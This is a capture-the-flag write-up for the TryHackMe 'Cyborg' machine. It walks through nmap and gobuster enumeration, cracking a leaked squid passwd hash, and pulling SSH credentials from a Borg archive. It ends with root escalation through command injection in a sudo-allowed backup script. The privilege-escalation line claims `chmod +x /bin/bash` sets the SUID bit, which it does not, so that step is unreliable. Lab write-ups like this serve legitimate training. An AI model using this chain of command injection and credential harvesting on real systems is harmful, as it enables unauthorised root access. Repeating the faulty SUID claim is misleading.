# [Machine](https://tryhackme.com/room/cyborgt8)

- # ENUM
	- ### nmap (`sudo nmap -sS -A -p- -T4 cyborg`)
		- ```PORT   STATE SERVICE VERSION
			22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
			|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
			|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
			80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
			|_http-title: Apache2 Ubuntu Default Page: It works
			|_http-server-header: Apache/2.4.18 (Ubuntu)
			Device type: general purpose
			Running: Linux 4.X
			OS CPE: cpe:/o:linux:linux_kernel:4.15
			OS details: Linux 4.15
			Network Distance: 2 hops
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://cyborg -x .html,.js,.css,.txt,.php`)
		- #### DIRECTORIES
			- `/admin`
			- `/etc`
			- `/etc/squid`
		- #### FILES
			- `/index.html`
			- `/admin/index.html`

- # EXPLOITATION
	- `http://cyborg/etc/squid/passwd` -> `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
		- Use `johntheripper` on this `APR1` (`john hash`)
			- Password: `squidward`		
	- There's a [Borg archive](https://borgbackup.readthedocs.io/) , let's extract it with the previous password (`borg extract home/field/dev/final_archive/::music_archive)
		- `note.txt`: `alex:S3cretP@s3`
			- SSH credentials!

- # PRIVILEGE ESCALATION
	- `sudo -l` -> `(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh`
		- There's a script!
			- ```while getopts c: flag
				do
				    case "${flag}" in 
				        c) command=${OPTARG};;
				    esac
				done
				...
				cmd=$($command)
				echo $cmd
				- We can inject this command: `./backup -c "chmod +x /bin/bash"` so bash will have SUID bit set!
					- `bash -p`
						- We're ROOT!
